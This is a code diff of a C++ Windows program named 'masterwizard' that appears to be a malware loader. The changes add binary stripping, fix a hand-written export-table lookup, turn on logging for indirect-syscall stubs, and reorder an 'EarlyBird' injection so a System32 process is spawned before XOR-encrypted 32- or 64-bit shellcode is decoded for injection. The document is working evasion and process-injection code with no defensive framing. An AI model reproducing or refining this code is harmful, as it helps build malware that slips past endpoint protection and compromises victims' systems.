@@ -2,9 +2,8 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 #include "masterwizard.h"
-
 /*
-    g++ masterwizard.cpp masterwizard.o -o masterwizard.exe
+    g++ -s -fmerge-all-constants masterwizard.cpp masterwizard.o -o masterwizard.exe 
 */
 
 //============== Obfuscated Vars ================
@@ -64,7 +63,7 @@ FARPROC __stdcall MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
     PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
 
-    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++){
         CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
         if (strcmp(pFunctionName, lpProcName) == 0) {
             WORD wFunctionOrdinal = FunctionOrdinalArray[i];
@@ -123,8 +122,8 @@ DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName, PSYSCAL
         return SSN;
     }
 
-    //printf("\t[+] %s stub : SSN 0x%x\n", NtFunctionName, SSN);
-    //printf("\t[+] %s stub : syscall @ 0x%p\n", NtFunctionName, stub);
+    printf("\t[+] %s stub : SSN 0x%x\n", NtFunctionName, SSN);
+    printf("\t[+] %s stub : syscall @ 0x%p\n", NtFunctionName, stub);
 
     sstub->SyscallId = SSN;
     sstub->SyscallFunc = stub;
@@ -165,16 +164,19 @@ int injectProc(){
     sprintf(lpPath, "C:\\windows\\System32\\%s", lpProcessName);
     printf("\n[+] Starting EarlyBird with DEBUG_PROCESS flag : \"%s\" ... \n", lpPath);
 
+    CreateEarlyBird(lpPath, &hProcess, &hThread, &dwProcessId);
+    printf("[*] hProcess %p | hThread %p | dwProcessId %d\n", hProcess, hThread, dwProcessId);
+
     if (!isWow64(hProcess)) {
         is64 = 1;
+        XOR(shellcode_64, sizeof(shellcode_64), key, sizeof(key));
         shellcode = shellcode_64;
         scSize = sizeof(shellcode_64);
     } else {
+        XOR(shellcode_32, sizeof(shellcode_32), key, sizeof(key));
         shellcode = shellcode_32;
         scSize = sizeof(shellcode_32);
     }
-
-    CreateEarlyBird(lpPath, &hProcess, &hThread, &dwProcessId);
 
     SYSCALL_STUB vaeStub = { 0 };
     getInDirectSyscallStub(hNtdll, (LPCSTR)_NtAllocateVirtualMemory, &vaeStub);
